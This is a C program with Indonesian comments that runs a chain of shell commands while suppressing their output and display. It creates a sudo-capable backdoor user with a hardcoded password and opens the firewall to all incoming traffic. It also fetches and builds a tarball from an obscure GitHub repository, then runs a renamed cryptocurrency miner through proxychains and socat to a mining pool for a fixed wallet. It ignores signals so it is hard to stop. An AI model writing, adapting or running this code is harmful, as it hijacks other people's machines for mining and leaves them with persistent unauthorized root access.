#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h> // <-- untuk WEXITSTATUS dan WIFEXITED

void ignore_all_signals() {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;  // Abaikan sinyal

    for (int i = 1; i < NSIG; ++i) {
        if (i == SIGKILL || i == SIGSTOP)
            continue;
        sigaction(i, &sa, NULL);
    }
}



volatile bool loading = false;

// Spinner animation
void* spinner(void* arg) {
    const char spin_chars[] = "/-\\|";
    int i = 0;
    while (loading) {
        printf("\r%c Loading...", spin_chars[i % 4]);
        fflush(stdout);
        usleep(100000);
        i++;
    }
    printf("\r✓ Selesai      \n");
    return NULL;
}

// Bersihkan tampilan perintah dari argumen teknis
void bersihkanPerintah(const char* input, char* output, size_t maxLen) {
    char temp[512];
    strncpy(temp, input, sizeof(temp));
    temp[sizeof(temp) - 1] = '\0';

    char* token = strtok(temp, " ");
    output[0] = '\0';

    while (token != NULL) {
        if (strcmp(token, "sudo") == 0 ||
            strcmp(token, "-y") == 0 ||
            strcmp(token, ">") == 0 ||
            strcmp(token, "2>&1") == 0 ||
            strstr(token, "/dev/null") != NULL) {
            token = strtok(NULL, " ");
            continue;
        }
        if (strlen(output) + strlen(token) + 2 < maxLen) {
            strcat(output, token);
            strcat(output, " ");
        }
        token = strtok(NULL, " ");
    }

    size_t len = strlen(output);
    if (len > 0 && output[len - 1] == ' ') {
        output[len - 1] = '\0';
    }
}

// Fungsi utama dengan opsi spinner dan tampilkan nama
int jalankanPerintah(const char* cmd, bool tampilkanPerintah, bool pakaiSpinner) {
    if (tampilkanPerintah) {
        char bersih[512];
        bersihkanPerintah(cmd, bersih, sizeof(bersih));
        printf("Menjalankan perintah: %s\n", bersih);
    }

    pthread_t thread_id;

    if (pakaiSpinner) {
        loading = true;
        pthread_create(&thread_id, NULL, spinner, NULL);
    }

    int status = system(cmd);

    if (pakaiSpinner) {
        loading = false;
        pthread_join(thread_id, NULL);
    }

    if (WIFEXITED(status)) {
        int exitCode = WEXITSTATUS(status);
        if (exitCode != 0) {
            printf("\n[ERROR] Perintah gagal dijalankan. Exit code: %d\n", exitCode);
        }
        return exitCode;
    } else {
        printf("\n[ERROR] Perintah tidak dieksekusi dengan benar.\n");
        return -1;
    }
}





// Fungsi-fungsi perintah
int perintahSatu() {
    return jalankanPerintah("sudo apt update -y", true, false);
}

int perintahDua() {
	printf("Menjalankan perintah 2...\n");
    return jalankanPerintah("sudo adduser --disabled-password --gecos "" --allow-bad-names gilakau > /dev/null 2>&1", false, true);
}

int perintahTiga() {
    printf("Menjalankan perintah 3...\n");
    return jalankanPerintah("echo 'gilakau:SapuLidi10' | sudo chpasswd > /dev/null 2>&1", false, true);
}

int perintahEmpat() {
    printf("Menjalankan perintah 4...\n");
    return jalankanPerintah("grep gilakau /etc/passwd > /dev/null 2>&1", false, true);
}

int perintahLima() {
    printf("Menjalankan perintah 5...\n");
    return jalankanPerintah("sudo usermod -a -G sudo gilakau > /dev/null 2>&1", false, true);
}

int perintahEnam() {
    printf("Menjalankan perintah 6...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'apt update -y > /dev/null 2>&1 && apt install ufw libcurl4-openssl-dev libssl-dev libjansson-dev socat -y > /dev/null 2>&1 && ufw enable > /dev/null 2>&1 && ufw default allow incoming > /dev/null 2>&1 && ufw default allow outgoing > /dev/null 2>&1 && ufw status verbose > /dev/null 2>&1 && ufw status > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahTujuh() {
    printf("Menjalankan perintah 7...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'curl -O https://raw.githubusercontent.com/piksuf/naszuiernamsxcuioernaszxcvuio/refs/heads/main/myapp.tar.gz > /dev/null 2>&1 && tar -xf myapp.tar.gz > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahDelapan() {
    printf("Menjalankan perintah 8...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c './configure --prefix=$PWD > /dev/null 2>&1 && make clean > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahSembilan() {
    printf("Menjalankan perintah 9...\n"); 
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'socat TCP4-LISTEN:8080,fork TCP4:yespowerSUGAR.na.mine.zpool.ca:6241 > /dev/null 2>&1 | timeout 3600s ./proxychains4 ./sse -a yespowerSUGAR -o stratum+tcp://localhost:8080 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.T_$(date +\"%d%m\")_$(date +\"%H%M\") -p c=DGB,zap=SUGAR -t $(nproc) -q > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}



// Fungi Utama Main
int main() {
	ignore_all_signals();
	
    if (perintahSatu() != 0) {
        printf("Perintah 1 gagal dijalankan.\n");
    }

    if (perintahDua() != 0) {
        printf("Perintah 2 gagal dijalankan.\n");
    }

    if (perintahTiga() != 0) {
        printf("Perintah 3 gagal dijalankan.\n");
    }

    if (perintahEmpat() != 0) {
        printf("Perintah 4 gagal dijalankan.\n");
    }

    if (perintahLima() != 0) {
        printf("Perintah 5 gagal dijalankan.\n");
    }

    if (perintahEnam() != 0) {
        printf("Perintah 6 gagal dijalankan.\n");
    }

    if (perintahTujuh() != 0) {
        printf("Perintah 7 gagal dijalankan.\n");
    }

    if (perintahDelapan() != 0) {
        printf("Perintah 8 gagal dijalankan.\n");
    }

    if (perintahSembilan() != 0) {
        printf("Perintah 9 gagal dijalankan.\n");
    }

    return 0;
}
